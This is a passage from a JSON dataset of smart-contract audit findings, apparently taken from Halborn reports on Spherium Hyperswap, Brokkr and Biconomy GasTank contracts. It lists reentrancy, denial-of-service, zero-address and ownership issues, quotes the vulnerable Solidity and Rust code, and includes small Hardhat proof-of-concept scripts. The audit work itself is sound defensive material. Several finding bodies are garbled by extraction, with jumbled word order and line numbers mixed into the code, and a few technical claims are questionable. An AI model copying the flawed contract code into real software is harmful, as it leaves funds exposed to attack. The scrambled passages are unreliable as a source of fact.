        "body": "It was identified that core-bsc Contracts are missing nonReentrant guard. In contract SpheriumPair.sol, functions burn, swap, and skim are missing Also, in skim function, read of persistent state nonReentrant guard. following external call is identified, and in burn, swap function, state variables written after the call, making it vulnerable to a Reentrancy attack. To protect against cross-function reentrancy attacks, it may be necessary to use a mutex. By using this lock, an attacker can no longer exploit the function with a recursive call. OpenZeppelin has its own mutex implementation called ReentrancyGuard which provides a modifier to any function called nonReentrant that guards the function with a mutex against the Reentrancy attacks. Code Location: Listing 6: core-bsc/contracts/SpheriumPair.sol (Lines 194,195) 191 192 193 194 195 196 function skim ( address to ) external lock { address _token0 = token0 ; // gas savings address _token1 = token1 ; // gas savings _safeTransfer ( _token0 , to , IERC20 ( _token0 ). balanceOf ( address ( this )) . sub ( reserve0 )) ; _safeTransfer ( _token1 , to , IERC20 ( _token1 ). balanceOf ( address ( this )) . sub ( reserve1 )) ; } Risk Level: Likelihood - 1 Impact - 4 23 Recommendation: It is recommended to change the code to follow the checks-effects-interactions pattern and use ReentrancyGuard through the nonReentrant modifier. Remediation Plan: NOT APPLICABLE: The Spherium team claims that due to their use of lock modifier in pair contract suffice reentrancy protection. 24 ",
        "labels": [
            "Halborn",
            "Spherium_Hyperswap",
            "Severity: Low"
        ]
    },
    {
        "title": "MULTIPLE CALLS MAY LEADS TO DENIAL OF SERVICE(DOS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Spherium_Hyperswap_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In core-bsc contract SpheriumPair.sol multiple calls are executed in the same transaction. This call is executed following another call within the same transaction. It is possible that the call never gets executed if a prior call fails permanently and it may leads to DOS. This might be caused intentionally by a malicious call. Code Location: Listing 7: core-bsc/contracts/SpheriumPair.sol (Lines 194,195,200) 191 192 193 194 195 196 197 198 199 200 201 function skim ( address to ) external lock { address _token0 = token0 ; // gas savings address _token1 = token1 ; // gas savings _safeTransfer ( _token0 , to , IERC20 ( _token0 ). balanceOf ( address ( this )) . sub ( reserve0 )) ; _safeTransfer ( _token1 , to , IERC20 ( _token1 ). balanceOf ( address ( this )) . sub ( reserve1 )) ; } // force reserves to match balances function sync () external lock { _update ( IERC20 ( token0 ). balanceOf ( address ( this )) , IERC20 ( token1 ). balanceOf ( address ( this )) , reserve0 , reserve1 ); } Risk Level: Likelihood - 1 Impact - 4 25 Recommendation: If possible, refactoring the code such that each transaction only executes one external calls or make sure that all calls can be trusted (i.e. theyre part of your own codebase). Remediation Plan: RISK ACCEPTED: The Spherium team accepts the risk. 26 ",
        "labels": [
            "Halborn",
            "Spherium_Hyperswap",
            "Severity: Low"
        ]
    },
    {
        "title": "INCOMPATIBILITY WITH INFLATIONARY TOKENS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Spherium_Hyperswap_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "uses Uniswap multiple functions periphery-bsc TransferHelper In safeTransferFrom and safeTransfer to handle the token transfers. These functions call transferFrom and transfer internally in the token contract to actually execute the transfer. However, since the actual amount transferred i.e. the delta of previous (before transfer) and current (after transfer) balance is not verified, a malicious user may list a custom ERC20 token with the transferFrom or transfer function modified in such a way that it e.g. does not transfer any tokens at all and the attacker is still going to have their liquidity pool tokens minted anyway. In this case both tokens are set in the constructor by the creator of the contract, so they are trusted, but it would be still a good practice to perform this check. Code Location: Listing 8: periphery-bsc/contracts/SpheriumRouter01.sol 1 TransferHelper . safeTransferFrom ( tokenA , msg . sender , pair , amountA ) ; 2 TransferHelper . safeTransferFrom ( tokenB , msg . sender , pair , amountB ) ; 3 TransferHelper . safeTransferFrom ( token , msg . sender , pair , amountToken ); 4 TransferHelper . safeTransferFrom ( path [0] , msg . sender , SpheriumLibrary . pairFor ( factory , path [0] , path [1]) , amounts [0]) ; 5 TransferHelper . safeTransfer ( token , to , amountToken ); Listing 9: periphery-bsc/contracts/SpheriumRouter02.sol 1 TransferHelper . safeTransferFrom ( tokenA , msg . sender , pair , amountA ) ; 27 2 TransferHelper . safeTransferFrom ( tokenB , msg . sender , pair , amountB ) ; 3 TransferHelper . safeTransferFrom ( token , msg . sender , pair , amountToken ); 4 TransferHelper . safeTransferFrom ( path [0] , msg . sender , SpheriumLibrary . pairFor ( factory , path [0] , path [1]) , amounts [0]) ; 5 TransferHelper . safeTransferFrom ( path [0] , msg . sender , SpheriumLibrary . pairFor ( factory , path [0] , path [1]) , amountIn ); 6 TransferHelper . safeTransfer ( token , to , amountToken ); 7 TransferHelper . safeTransfer ( token , to , IERC20 ( token ). balanceOf ( address ( this ))); Recommendations: Whenever tokens are transferred, the delta of the previous (before transfer) and current (after transfer) token balance should be verified to match the user-declared token amount. Remediation Plan: RISK ACCEPTED: The Spherium team accepts the risk. 28 ",
        "labels": [
            "Halborn",
            "Spherium_Hyperswap",
            "Severity: Low"
        ]
    },
    {
        "title": "WEAK PSEUDO",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Spherium_Hyperswap_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "in of and and use library contract Contract block.timestamp SpheriumPair.sol SpheriumOracleLibrary.sol we noticed the use of now in core-bsc During a manual review, periphery-bsc SpheriumPair.sol function SpheriumOracleLibrary.sol. _update function currentBlockTimestamp uses a weak pseudo random number generator due to a modulo on now and blockTimestamp respectively i.e. uint32(now % 2 ** 32) The contract developers should and uint32(block.timestamp % 2 ** 32). be aware that this does not mean current time. now is an alias for block.timestamp. Miners can influence the value of block.timestamp to perform Maximal Extractable Value (MEV) attacks. The use of now creates a risk that time manipulation can be performed to manipulate price oracles. Miners can modify the timestamp by up to 900 seconds. Code Location: Listing 10: core-bsc/contracts/SpheriumPair.sol (Lines 76) 74 75 76 77 function _update ( uint balance0 , uint balance1 , uint112 _reserve0 , uint112 _reserve1 ) private { require ( balance0 <= uint112 ( -1) && balance1 <= uint112 ( -1) , ' Spherium : OVERFLOW '); uint32 blockTimestamp = uint32 ( now % 2**32) ; uint32 timeElapsed = blockTimestamp - blockTimestampLast ; // overflow is desired Listing 11: periphery-bsc/contracts/libraries/SpheriumOracleLibrary.sol (Lines 14) 13 14 15 function currentBlockTimestamp () internal view returns ( uint32 ) { return uint32 ( block . timestamp % 2 ** 32) ; } 29 Risk Level: Likelihood - 1 Impact - 4 Recommendation: Do not use now or blockTimestamp as a source of randomness. Use block .number instead of block.timestamp or now to reduce the risk of MEV attacks. Remediation Plan: RISK ACCEPTED: The Spherium team accepts the risk. 30 ",
        "labels": [
            "Halborn",
            "Spherium_Hyperswap",
            "Severity: Low"
        ]
    },
    {
        "title": "EXTERNAL FUNCTION CALLS WITHIN LOOP",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Spherium_Hyperswap_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Calls inside a loop increase Gas usage or might lead to a denial-of-service attack. In some of the functions discovered there is a for loop on variable i that iterates up to the path.length array length. If this integer is evaluated at extremely large numbers this can cause a DoS. Code Location: Listing 12: periphery-bsc/contracts/SpheriumRouter01.sol (Lines 175) 168 169 170 171 172 173 174 175 176 177 function _swap ( uint [] memory amounts , address [] memory path , address _to ) private { for ( uint i; i < path . length - 1; i ++) { ( address input , address output ) = ( path [i ], path [i + 1]) ; ( address token0 ,) = SpheriumLibrary . sortTokens ( input , output ); uint amountOut = amounts [ i + 1]; ( uint amount0Out , uint amount1Out ) = input == token0 ? ( uint (0) , amountOut ) : ( amountOut , uint (0) ) ; address to = i < path . length - 2 ? SpheriumLibrary . pairFor ( factory , output , path [i + 2]) : _to ; ISpheriumPair ( SpheriumLibrary . pairFor ( factory , input , output )) . swap ( amount0Out , amount1Out , to , new bytes (0) ); } } Listing 13: 232,233,234) periphery-bsc/contracts/SpheriumRouter02.sol (Lines 225 226 function _swap ( uint [] memory amounts , address [] memory path , address _to ) internal virtual { for ( uint i; i < path . length - 1; i ++) { 31 227 228 229 230 231 232 233 234 235 ( address input , address output ) = ( path [i ], path [i + 1]) ; ( address token0 ,) = SpheriumLibrary . sortTokens ( input , output ); uint amountOut = amounts [ i + 1]; ( uint amount0Out , uint amount1Out ) = input == token0 ? ( uint (0) , amountOut ) : ( amountOut , uint (0) ) ; address to = i < path . length - 2 ? SpheriumLibrary . pairFor ( factory , output , path [i + 2]) : _to ; ISpheriumPair ( SpheriumLibrary . pairFor ( factory , input , output )) . swap ( amount0Out , amount1Out , to , new bytes (0) ); } Listing 14: 349,351,356) periphery-bsc/contracts/SpheriumRouter02.sol (Lines 341 342 343 344 345 346 347 348 349 350 351 352 353 354 355 function _swapSupportingFeeOnTransferTokens ( address [] memory path , address _to ) internal virtual { for ( uint i; i < path . length - 1; i ++) { ( address input , address output ) = ( path [i ], path [i + 1]) ; ( address token0 ,) = SpheriumLibrary . sortTokens ( input , output ); ISpheriumPair pair = ISpheriumPair ( SpheriumLibrary . pairFor ( factory , input , output )) ; uint amountInput ; uint amountOutput ; { // scope to avoid stack too deep errors ( uint reserve0 , uint reserve1 ,) = pair . getReserves () ; ( uint reserveInput , uint reserveOutput ) = input == token0 ? ( reserve0 , reserve1 ) : ( reserve1 , reserve0 ); amountInput = IERC20 ( input ). balanceOf ( address ( pair )) . sub ( reserveInput ); amountOutput = SpheriumLibrary . getAmountOut ( amountInput , reserveInput , reserveOutput ); } ( uint amount0Out , uint amount1Out ) = input == token0 ? ( uint (0) , amountOutput ) : ( amountOutput , uint (0) ); address to = i < path . length - 2 ? SpheriumLibrary . pairFor ( factory , output , path [i + 2]) : _to ; 32 pair . swap ( amount0Out , amount1Out , to , new bytes (0) ); 356 357 358 } } Risk Level: Likelihood - 2 Impact - 3 Recommendation: If possible, use pull over push strategy for external calls. Reference: External Calls Recommendation Remediation Plan: RISK ACCEPTED: The Spherium team accepts the risk. 33 ",
        "labels": [
            "Halborn",
            "Spherium_Hyperswap",
            "Severity: Low"
        ]
    },
    {
        "title": "IGNORE RETURN VALUES",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Spherium_Hyperswap_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The return value of an external call is not stored in a local or state variable. In contract SpheriumRouter01.sol and SpheriumRouter02.sol, there are instances where external methods are being called and return value are being ignored. It was observed that contract SpheriumRouter01.sol and SpheriumRouter02 .sol function _addLiquidity ignores return value by ISpheriumFactory( factory).createPair(tokenA, tokenB). Code Location: Listing 15: periphery-bsc/contracts/SpheriumRouter01.sol (Lines 39) 29 30 31 32 33 34 35 36 37 38 39 40 function _addLiquidity ( address tokenA , address tokenB , uint amountADesired , uint amountBDesired , uint amountAMin , uint amountBMin ) private returns ( uint amountA , uint amountB ) { // create the pair if it doesn 't exist yet if ( ISpheriumFactory ( factory ). getPair ( tokenA , tokenB ) == address (0) ) { ISpheriumFactory ( factory ). createPair ( tokenA , tokenB ); } Listing 16: periphery-bsc/contracts/SpheriumRouter02.sol (Lines 56) 46 47 48 49 50 function _addLiquidity ( address tokenA , address tokenB , uint amountADesired , uint amountBDesired , 34 51 52 53 54 55 56 57 uint amountAMin , uint amountBMin ) internal virtual returns ( uint amountA , uint amountB ) { // create the pair if it doesn 't exist yet if ( ISpheriumFactory ( factory ). getPair ( tokenA , tokenB ) == address (0) ) { ISpheriumFactory ( factory ). createPair ( tokenA , tokenB ); } Risk Level: Likelihood - 3 Impact - 2 Recommendation: Add return value check to avoid unexpected crash of the contract. Return value check will help in handling the exceptions better way. Remediation Plan: RISK ACCEPTED: The Spherium team accepts the risk. 35 ",
        "labels": [
            "Halborn",
            "Spherium_Hyperswap",
            "Severity: Low"
        ]
    },
    {
        "title": "MISSING ZERO",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Spherium_Hyperswap_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "There are multiple instances found where Address validation is missing. Lack of zero address validation has been found when assigning user supplied address values to state variables directly. In core-bsc contract SpheriumFactory.sol function setFeeTo(address) lacks a zero-check on _feeTo, function setFeeToSetter(address) lacks a zero-check on _feeToSetter, and constructor constructor(address) lacks a zero-check on _feeToSetter. In contract SpheriumPair.sol function initialize(address,address) lacks a zero-check on _token0 and _token1. In periphery-bsc contracts SpheriumRouter01.sol and SpheriumRouter02.sol constructor lacks a zero-check on _factory and _WETH. In governance contract SpheriumToken-TGE.sol function createLGEWhitelist lacks a zero-check on pairAddress. Code Location: Listing 17: core-bsc/contracts/SpheriumFactory.sol (Lines 19) 18 19 20 constructor ( address _feeToSetter ) public { feeToSetter = _feeToSetter ; } Listing 18: core-bsc/contracts/SpheriumFactory.sol (Lines 46) 44 45 46 47 function setFeeTo ( address _feeTo ) external { require ( msg . sender == feeToSetter , ' Spherium : FORBIDDEN '); feeTo = _feeTo ; } Listing 19: core-bsc/contracts/SpheriumFactory.sol (Lines 51) 49 50 function setFeeToSetter ( address _feeToSetter ) external { require ( msg . sender == feeToSetter , ' Spherium : FORBIDDEN '); 36 51 52 } feeToSetter = _feeToSetter ; Listing 20: core-bsc/contracts/SpheriumPair.sol (Lines 69,70) 67 68 69 70 71 function initialize ( address _token0 , address _token1 ) external { require ( msg . sender == factory , ' Spherium : FORBIDDEN '); // sufficient check token0 = _token0 ; token1 = _token1 ; } Listing 21: periphery-bsc/contracts/SpheriumRouter01.sol (Lines 20,21) 19 20 21 22 constructor ( address _factory , address _WETH ) public { factory = _factory ; WETH = _WETH ; } Listing 22: periphery-bsc/contracts/SpheriumRouter02.sol (Lines 32,33) 31 32 33 34 constructor ( address _factory , address _WETH ) public { factory = _factory ; WETH = _WETH ; } Listing 23: governance/contracts/SpheriumToken-TGE.sol (Lines 389) 382 383 384 385 386 387 388 389 function createLGEWhitelist ( address pairAddress , uint256 [] calldata durations , uint256 [] calldata amountsMax ) external onlyWhitelister () { require ( durations . length == amountsMax . length , \" Invalid whitelist ( s) \" ); _lgePairAddress = pairAddress ; 37 Risk Level: Likelihood - 2 Impact - 3 Recommendation: Although administrative restrictions are imposed to this function due to the OpenZeppelin RBAC it is better to add proper address validation when assigning a value to a variable from user supplied inputs. Remediation Plan: RISK ACCEPTED: The Spherium team accepts the risk. 38 3.10 (HAL-10) USAGE OF BLOCK-TIMESTAMP - LOW ",
        "labels": [
            "Halborn",
            "Spherium_Hyperswap",
            "Severity: Informational"
        ]
    },
    {
        "title": "PRIVILEGED ADDRESS CAN BE TRANSFERRED WITHOUT CONFIRMATION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Brokkr_Protocol_P3_Contracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Incorrect use of the update_config function in contracts can set the owner to have an invalid address and inadvertently lose control of the contracts, which cannot be undone in any way. Currently, the contract owner can change the owner address using the aforementioned function in a single transaction and without confirmation from the new address. The affected smart contracts are the following:  rewards  epoch-manager  token-pool Code Location: In the epoch manager contract: Listing 1: contracts/epoch-manager/src/commands.rs (Line 20) 19 if let Some ( owner ) = owner { 20 21 } config . owner = deps . api . addr_canonicalize (& owner ) ?; In the rewards contract: Listing 2: contracts/rewards/src/commands.rs (Line 30) 29 if let Some ( owner ) = owner { 30 31 } config . owner = deps . api . addr_canonicalize (& owner ) ?; 13 In the token-pool contract: Listing 3: contracts/rewards/src/commands.rs (Line 93) 92 if let Some ( owner ) = owner { 93 94 } config . owner = deps . api . addr_canonicalize (& owner ) ?; Risk Level: Likelihood - 2 Impact - 4 Recommendation: It is recommended to split owner transfer functionality into the set_owner and accept_ownership functions. The last function allows the recipient to complete the transfer. Remediation plan: SOLVED: The issue was fixed in commit 79549c38936e99a89a1fa7aa7e38456032f47389. 14 ",
        "labels": [
            "Halborn",
            "Brokkr_Protocol_P3_Contracts_CosmWasm",
            "Severity: Medium"
        ]
    },
    {
        "title": "REWARDS SPEND LIMIT CAN BE IGNORED",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Brokkr_Protocol_P3_Contracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The rewards contract has a spend_limit attribute that caps the maximum amount a distributor can spend in a transaction. However, the amount of each distribution message is verified separately instead of checking that the global amount spent is less than the spending limit. That allows a distributor to bypass the restriction in a transaction. Users who interact with the distribute function must be whitelisted first. Therefore, the likelihood of such a scenario is low. Code Location: Listing 4: contracts/rewards/src/commands.rs, (Lines 129-131) return Err ( ContractError :: SpendLimitReached {}) ; } if config . spend_limit < distribution . amount { 127 let mut msgs : Vec < CosmosMsg > = vec! []; 128 for distribution in distributions { 129 130 131 132 133 134 135 136 137 138 139 140 contract : distribution . contract , amount : distribution . amount , msg : distribution . msg , contract_addr : bro_token . clone () , funds : vec! [] , msg : to_binary (& Cw20ExecuteMsg :: Send { msgs . push ( CosmosMsg :: Wasm ( WasmMsg :: Execute { }) ?, Risk Level: Likelihood - 1 Impact - 1 15 Recommendation: It is recommended to compare the total amount spent with the spend_limit. Remediation plan: SOLVED: The issue was fixed in commit a9856345f269ca5275236297feae192d1ee4cec4. 16 ",
        "labels": [
            "Halborn",
            "Brokkr_Protocol_P3_Contracts_CosmWasm",
            "Severity: Informational"
        ]
    },
    {
        "title": "LACK OF VALIDATION WHEN UPDATING EPOCH STATE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Brokkr_Protocol_P3_Contracts_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "When updating the epoch manager status, the owner can set the following attributes:  epochs (number of blocks in an epoch)  blocks_per_year  bbro_emission_rate The absence of validation allows the variables to be set to 0, inducing malfunction in the contracts by querying the epoch-manager: staking-v1 and distributor-v1. For example, epochs with a value of 0 will cause a 0-unverified division in the distributor-v1 contract, and a 0-verified division in the staking-v1 contract, causing transactions to go into panic. However, only an administrator can update these values. Therefore, the likelihood is limited. Code Location: Absence of validation when updating the state value in epoch-manager: Listing 5: contracts/epoch-manager/src/commands.rs, (Line 60) state . epoch = epoch ; 46 let mut state = load_state ( deps . storage ) ?; 47 48 if let Some ( epoch ) = epoch { 49 50 } 51 52 if let Some ( blocks_per_year ) = blocks_per_year { 53 state . blocks_per_year = blocks_per_year ; 17 54 } 55 56 if let Some ( bbro_emission_rate ) = bbro_emission_rate { 57 58 } 59 60 store_state ( deps . storage , & state ) ?; state . bbro_emission_rate = bbro_emission_rate ; In staking-v1, when calling compute_normal_bbro_reward: Listing 6: contracts/staking-v1/src/state.rs, (Line 164) 161 let epoch_info = query_epoch_info ( querier , epoch_manager_contract )  ?; 162 163 let epochs_staked = Uint128 :: from ( state . last_distribution_block -  self . last_balance_update ) 164 . checked_div ( Uint128 :: from ( epoch_info . epoch )) ?; In distributor, when calling distribute: Listing 7: contracts/distributor-v1/src/commands.rs, (Line 44) & deps . querier , deps . api . addr_humanize (& config . epoch_manager_contract )? , 35 // query epoch from epoch_manager contract 36 let epoch_blocks = query_epoch_info ( 37 38 39 )? 40 . epoch ; 41 42 // distribute rewards only for passed epochs 43 let blocks_since_last_distribution = env . block . height - state .  last_distribution_block ; 44 let passed_epochs = blocks_since_last_distribution / epoch_blocks ; 45 if passed_epochs == 0 { 46 47 } return Err ( ContractError :: NoRewards {}) ; 18 Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to check the values of the status parameters before storing them. Remediation plan: SOLVED: The issue was fixed in commit 1c7ab7d56ae6ad16c88d8fdfeddb4e3e8e571f85. 19 ",
        "labels": [
            "Halborn",
            "Brokkr_Protocol_P3_Contracts_CosmWasm",
            "Severity: Informational"
        ]
    },
    {
        "title": "CONTRACT UPGRADE/INITIALIZATION DROPS MINIMUM DEPOSIT VALUE TO ZERO",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_GasTank_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "There is a mapping on the GasTank contract where deposited asset amounts are mapped with addresses. The amount of assets deposited on the contract is also kept on this variable. While defining the minDeposit variable, which controls the amount of assets to be sent to the MasterAccount, this value was determined as 1e18 at the contract itself. However, when this value is checked after the contract is initialized or upgraded, it is seen that minDeposit value is dropped to 0. Code Location: Listing 1: DappGasTank.sol (Lines 58) 57 address payable public masterAccount ; 58 uint256 public minDeposit = 1 e18 ; Listing 2: DappGasTank.sol 79 function initialize ( address trustedForwarder ) public initializer { 80 81 82 83 __ERC2771Context_init ( trustedForwarder ); __Ownable_init () ; _initializedVersion = 0; } 13 PoC Code: Hardhat Test Script It is recommended to run the following test script after contract ini- tialization. Listing 3: scripts/halborn-minDeposit.js try { 1 async function main () { 2 3 4 5 6 7 8 9 const owner = \"\" ; // Owner Address const proxyAdmin = \"\" ; // Proxy Admin Address const relayerMasterAccount = \" \" ; // MasterAccount Address const proxyAddress = \" \"; // Proxy Address let gasTankProxy = await hre . ethers . getContractAt ( \" contracts /7/ gas - manager / gas - tank / DappGasTank . sol : DappGasTank \" , proxyAddress ); 10 11 console . log (\" MinDeposit Value : \" + await gasTankProxy . minDeposit () ); } 12 13 14 15 16 } 17 18 main () 19 20 21 22 23 }) ; } catch ( error ) { console . log ( error ); . then (() => process . exit (0) ) . catch ( error => { console . error ( error ); process . exit (1) ; Output: 14 Risk Level: Likelihood - 3 Impact - 4 Recommendations: It is recommended to define a valid number for minDeposit variable while initializing or upgrading the contract. Remediation Plan: SOLVED: The Biconomy Team solved this issue by controlling the minDeposit variable. Commit ID: 4e2a4ada3f1629b51018dc45c4b9f1af6c2a02c4 15 ",
        "labels": [
            "Halborn",
            "Biconomy_GasTank",
            "Severity: Medium"
        ]
    },
    {
        "title": "MISSING ROLE",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_GasTank_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "In smart contracts, implementing a correct Access Control policy is an essential step to maintain security and decentralization of permissions on a token. All the features of the smart contract , such as mint/burn tokens and pause contracts are given by Access Control. For instance, Ownership is the most common form of Access Control. In other words, the owner of a contract (the account that deployed it by default) can do some administrative tasks on it. Nevertheless, other authorization levels are required to follow the principle of least privilege, also known as least authority. Briefly, any process, user or program only can access to the necessary resources or information. Otherwise, the ownership role is useful in a simple system, but more complex projects require the use of more roles by using Role-based access control. There are multiple important functionalities on DappGasTank.sol, con- tract such as allowing/disabling tokens for transfer, adjusting minimum deposit amount and withdrawing assets. It is important to divide these functionalities into multiple roles. Code Location: Listing 4: Centralized Functions 1 function setMinDeposit ( uint256 _newMinDeposit ) external onlyOwner 2 function setTrustedForwarder ( address payable _forwarder ) external onlyOwner 3 function setMasterAccount ( address payable _newAccount ) external onlyOwner 4 function setTokenAllowed ( address token , bool allowed ) external onlyOwner 5 function withdraw ( uint256 _amount ) public onlyOwner 16 Risk Level: Likelihood - 3 Impact - 3 Recommendations: RESOURCE_SETTER role and onlyResourceSetter modifier should be imple- mented for the following functions to avoid centralization on the con- tract. Listing 5: Asset-Related Functions 1 function setMinDeposit ( uint256 _newMinDeposit ) external onlyOwner 2 function setTokenAllowed ( address token , bool allowed ) external onlyOwner 3 function withdraw ( uint256 _amount ) public onlyOwner Remediation Plan: ACKNOWLEDGED: The Biconomy Team acknowledged this issue. 17 ",
        "labels": [
            "Halborn",
            "Biconomy_GasTank",
            "Severity: Medium"
        ]
    },
    {
        "title": "OWNER CAN RENOUNCE OWNERSHIP",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_GasTank_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "Owner of the contract is usually the account which deploys the contract. As a result, the Owner can perform some privileged functions the like transferOwnership(). renounceOwnership function is used to renounce being Owner. Otherwise, if the ownership was not transferred before, the contract will never have an Owner, which is dangerous. In DappGasTank.sol smart contract, Code Location: Listing 6: DappGasTank.sol (Lines 55) 55 contract DappGasTank is Initializable , OwnableUpgradeable , ERC2771ContextUpgradeable { PoC Code: Hardhat Test Script Listing 7: scripts/halborn-renounceOwnership.js try { 1 async function main () { 2 3 4 5 6 7 8 9 const owner = \"\" ; // Owner Address const proxyAdmin = \"\" ; // ProxyAdmin Address const relayerMasterAccount = \" \" ; // MasterAccount Address const proxyAddress = \" \"; // Proxy Address let gasTankProxy = await hre . ethers . getContractAt ( \" contracts /7/ gas - manager / gas - tank / DappGasTank . sol : DappGasTank \" , proxyAddress ); 10 18 11 12 13 console . log (\" Owner address before renounceOwnership () method : \" + await gasTankProxy . owner () ); tx = await gasTankProxy . renounceOwnership () ; console . log (\" Owner address after renounceOwnership () method : \" + await gasTankProxy . owner () ); } 14 15 16 17 18 } 19 20 main () 21 22 23 24 25 }) ; } catch ( error ) { console . log ( error ); . then (() => process . exit (0) ) . catch ( error => { console . error ( error ); process . exit (1) ; Output: Risk Level: Likelihood - 1 Impact - 3 Recommendations: It is recommended that the Owner cannot call renounceOwnership without transferring the Ownership to other address before. In addition, if a multi-signature wallet is used, calling renounceOwnership function should be confirmed for two or more users. Remediation Plan: ACKNOWLEDGED: The Biconomy Team acknowledged this issue. 19 ",
        "labels": [
            "Halborn",
            "Biconomy_GasTank",
            "Severity: Low"
        ]
    },
    {
        "title": "LACK OF ZERO ADDRESS CHECK",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_GasTank_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The DappGasTank.sol contract have multiple input fields on their both public and private functions. Some of these inputs are required as address variable. During the test, it has seen all of these inputs are not protected against using the address(0) as the target address. It is not recommended to use zero address as target addresses on the contracts. Code Location: Listing 8: DappGasTank.sol (Lines 79,80) 79 function initialize ( address trustedForwarder ) public initializer { 80 81 82 83 __ERC2771Context_init ( trustedForwarder ); __Ownable_init () ; _initializedVersion = 0; } Listing 9: DappGasTank.sol (Lines 152,153) 152 function setMasterAccount ( address payable _newAccount ) external onlyOwner { 153 154 155 } masterAccount = _newAccount ; emit MasterAccountChanged ( _newAccount , msg . sender ); Risk Level: Likelihood - 3 Impact - 1 20 Recommendations: It is recommended to implement additional address check to detect is current contract getting used as a target address. Listing 10: DappGasTank.sol 79 function initialize ( address trustedForwarder ) public initializer { 80 require ( trustedForwarder != address (0) , \" Trusted Forwarder can not be zero address .\" ) __ERC2771Context_init ( trustedForwarder ); __Ownable_init () ; _initializedVersion = 0; 81 82 83 84 } Listing 11: DappGasTank.sol 152 function setMasterAccount ( address payable _newAccount ) external onlyOwner { 153 154 155 156 } require ( _newAccount != address (0) , \" Master Account can not be zero address .\" ) masterAccount = _newAccount ; emit MasterAccountChanged ( _newAccount , msg . sender ); Remediation Plan: SOLVED: The Biconomy Team solved this issue by implementing zero address checks. Commit ID: 4e2a4ada3f1629b51018dc45c4b9f1af6c2a02c4 21 ",
        "labels": [
            "Halborn",
            "Biconomy_GasTank",
            "Severity: Low"
        ]
    },
    {
        "title": "PRAGMA VERSION IS TOO PRIOR",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_GasTank_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The project uses one of the latest pragma version (0.8.0) which was released on 16th of December, 2020. The latest pragma version (0.8.9) Many pragma versions have been lately was released in October 2021. released, going from version 0.7.x to the recently released version 0.8.x. in just 6 months. In the Solitidy Github repository, there is a JSON file where are all bugs finding in the different compiler versions. It should be noted that pragma 0.6.12 and 0.7.6 are widely used by Solidity developers and have been extensively tested in many security audits. Code Location: Listing 12: DappGasTank.sol (Lines 1) 1 pragma solidity ^0.8.0; 2 // SPDX - License - Identifier : MIT Risk Level: Likelihood - 2 Impact - 2 Recommendations: If possible, consider using the latest stable pragma version that has been thoroughly tested to prevent potential undiscovered vulnerabilities such as pragma between 0.6.12 - 0.7.6. 22 References:  Solidity Releases  Solidity Bugs By Version Remediation Plan: ACKNOWLEDGED: The Biconomy Team acknowledged this issue. 23 ",
        "labels": [
            "Halborn",
            "Biconomy_GasTank",
            "Severity: Low"
        ]
    },
    {
        "title": "FLOATING PRAGMA",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_GasTank_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
        "body": "The project contains many instances of floating pragma. Contracts should be deployed with the same compiler version and flags that they have been tested with thoroughly. Locking the pragma helps to ensure that contracts do not accidentally get deployed using, for example, either an outdated compiler version that might introduce bugs that affect the contract system negatively or a pragma version too recent which has not been extensively tested. Code Location: Listing 13: DappGasTank.sol (Lines 1) 1 pragma solidity ^0.8.0; 2 // SPDX - License - Identifier : MIT Risk Level: Likelihood - 2 Impact - 2 Recommendations: Consider locking the pragma version with known bugs for the compiler When possible, do not use version by removing the caret (^) symbol. floating pragma in the final live deployment. Specifying a fixed compiler version ensures that the bytecode produced does not vary between builds. This is especially important if you rely on bytecode-level verification of the code. 24 Remediation Plan: SOLVED: The Biconomy Team solved this issue by locking the pragma version. Commit ID: 4e2a4ada3f1629b51018dc45c4b9f1af6c2a02c4 25 ",
        "labels": [
            "Halborn",
            "Biconomy_GasTank",
            "Severity: Low"
        ]
    },
    {
        "title": "MISSING REENTRANCY PROTECTION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Biconomy_GasTank_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf",
